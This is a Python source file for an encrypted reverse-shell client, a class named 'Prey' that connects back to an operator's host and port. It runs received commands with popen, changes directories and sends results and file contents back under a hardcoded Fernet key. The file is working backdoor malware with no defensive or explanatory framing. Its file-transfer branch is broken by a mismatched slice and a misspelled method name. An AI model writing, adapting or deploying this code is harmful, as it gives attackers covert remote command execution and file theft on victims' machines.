#-*-coding: utf-8-*-
from socket import socket, AF_INET, SOCK_STREAM
from cryptography.fernet import Fernet as fern
from os import popen, chdir, getcwd

class Prey:
	def __init__(self, ip="127.0.0.1", port=5000,key="FUYG1sNMAm-QVFJ02RMh6Bpms7bxZSMLmqjmnJXsO3w="):
		self.f = fern(key.encode())
		self.sock = socket(AF_INET, SOCK_STREAM)
		self.sock.connect((ip, port))
	def shell(self):
		cmd = ""
		while cmd != "exit":
			self.sendmsj(str(getcwd()))
			cmd = self.sock.recv(1024)
			cmd = self.decodecmd(cmd)
			cmd = cmd.lower()
			if cmd[:2] == "cd":
				try:
					chdir(cmd[3:])
				except FileNotFoundError:
					self.sendmsj("Dir not found.")
			elif cmd[:6] == "getfile":
				self.sendfile(cmd[7:])
			else: 
				out = popen(cmd)
				o = out.read()
				print(o)
				self.sendmsj(o)

	def sendmsj(self, msj):
		if not type(b"") == type(msj):
			msj = msj.encode()
		msj = self.f.encrypt(msj)
		self.sock.send(msj)
	def decodecmd(self, c):
		try:
			c = self.f.decrypt(c)
			c = c.decode()
			return c
		except Exception as e:
			self.sendmsj("Exception: \n{}".format(e))
		
	def senfile(self, file):
		try:
			with open(file, "rb") as f:
				content = f.read(3072)
			self.sendmsj("Sending file.")
			self.sendmsj(content)
		except FileNotFoundError:
			self.sendmsj("File not found.")
def main():
	p = Prey()
	p.shell()

if __name__ == '__main__':
	main()